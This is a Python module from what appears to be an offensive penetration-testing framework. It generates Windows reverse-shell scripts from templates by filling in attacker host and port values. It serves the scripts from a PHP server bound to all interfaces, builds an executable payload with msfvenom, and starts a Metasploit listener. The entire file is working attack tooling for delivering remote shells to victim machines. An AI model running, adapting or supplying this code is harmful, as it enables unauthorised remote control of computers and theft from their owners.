#!/usr/bin/env python3

import os
import json
import subprocess as subp
from modules.sftp import sftp
R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

def rshell(win):
	print('\n', end='')
	rs_scripts = []
	for (dirpath, dirname, filenames) in os.walk('scripts/windows/reverse_shell'):
		rs_scripts.extend(filenames)
	for item in rs_scripts:
		print(G + '[{}] '.format(rs_scripts.index(item)) + C + item)

	while True:
		try:
			rshell_choice = input(G + '\nfs[windows/reverse_shell] > ' + W)

			if rshell_choice == 'clear':
				os.system('clear')
			elif rshell_choice == 'back':
				return win()
			elif rshell_choice == 'help':
				return rshell(win)
			elif rshell_choice == '':
				pass
			elif rshell_choice == 'exit' or rshell_choice == 'quit':
				quit()
			elif int(rshell_choice) <= len(rs_scripts) - 1:
				with open('conf/rshell_scripts.json', 'r') as json_file:
					options = json.load(json_file)
			
				rshell.chosen = rs_scripts[int(rshell_choice)]
			
				for k,v in options.items():
					if k in rshell.chosen:
						try:
							sftp_state = v['sftp']
							msf_state = v['msf']
							desc = v['desc']
							rshell.module = v['module']
							rshell.srv_state = v['srv']
							rshell.target = v['target']
						except KeyError:
							pass
						
						print('\n', end = '')
						print(G + '[+]' + C + ' Script : ' + W + rshell.chosen + '\n')
						print(G + '[+]' + C + ' Info : ' + W + desc + '\n')
						
						if sftp_state == 1:
							sftp()
						else:
							pass
						
						if msf_state == 1:
							print(G + '[+]' + C + ' Module : ' + W + rshell.module + '\n')
							rshell.payload = input(G + '[+]' + C + ' Payload : ' + W)
							rshell.lhost = input(G + '[+]' + C + ' LHOST : ' + W)
							rshell.lport = input(G + '[+]' + C + ' LPORT : ' + W)
						else:
							pass
						
						if rshell.srv_state == 1:
							rshell.srvhost = input(G + '[+]' + C + ' SRVHOST : ' + W)
							rshell.srvport = input(G + '[+]' + C + ' SRVPORT : ' + W)
						else:
							rshell.php_port = input(G + '[+]' + C + ' PHP Server Port : ' + W)
							print(G + '[+]' + C + ' Starting PHP Server...' + W)
							subp.Popen(['php', '-S', '0.0.0.0:{}'.format(rshell.php_port)], stdout=subp.PIPE)
							
						rshell.filename = input(G + '[+]' + C + ' Filename (Without Extension) : ' + W)
						rshell.script_path = '/scripts/windows/reverse_shell/' + rshell.chosen
						rshell_output()
						msf()
			else:
				print('\n' + R + '[-]' + C + ' Invalid Input...' + W)
				pass
		except ValueError:
			print('\n' + R + '[-]' + C + ' Invalid Input...' + W)
			pass
		
def rshell_output():
	base_path = os.getcwd() + rshell.script_path

	with open(base_path, 'r') as file :
		filedata = file.read()
	
	if rshell.srv_state == 1:
		filedata = filedata.replace('SRVHOST', rshell.srvhost)
		filedata = filedata.replace('SRVPORT', rshell.srvport)
	else:
		filedata = filedata.replace('LHOST', rshell.lhost)
		filedata = filedata.replace('PHPPORT', rshell.php_port)

	filedata = filedata.replace('FILENAME', rshell.filename)

	with open('output/{}'.format(rshell.chosen), 'w') as file:
		file.write(filedata)

	outfile_path = os.getcwd() + '/output/{}'.format(rshell.chosen)
	
	print(G + '[+]' + C + ' Script Generated : ' + W + outfile_path)

def msf():
	msf_choice = input(G + '[+]' + C + ' Start Metasploit Framework [y/n]: ' + W)
	if msf_choice == 'y':
		print('\n', end='')
		if rshell.srv_state == 1:
			subp.call(['msfconsole', '-q', '-x', 'use {}; \
				set payload {}; \
				set LHOST {}; \
				set LPORT {}; \
				set target {}; \
				set SRVHOST {}; \
				set SRVPORT {}; \
				set URIPATH {}; \
				exploit -j'.format(rshell.module, rshell.payload, rshell.lhost, rshell.lport, rshell.target, rshell.srvhost, rshell.srvport, rshell.filename)])
	
		else:
			print(G + '[+]' + C + ' Generating Payload...' + W + '\n')
			subp.call(['msfvenom', 
				'-p', '{}'.format(rshell.payload), 
				'LHOST={}'.format(rshell.lhost),
				'LPORT={}'.format(rshell.lport),
				'-f', 'exe',
				'-o', '{}.exe'.format(rshell.filename)])

			subp.call(['msfconsole', '-q', '-x', 'use {}; \
				set payload {}; \
				set LHOST {}; \
				set LPORT {}; \
				set target {}; \
				exploit -j'.format(rshell.module, rshell.payload, rshell.lhost, rshell.lport, rshell.target)])
	
	elif msf_choice == 'n':
		pass
	else:
		pass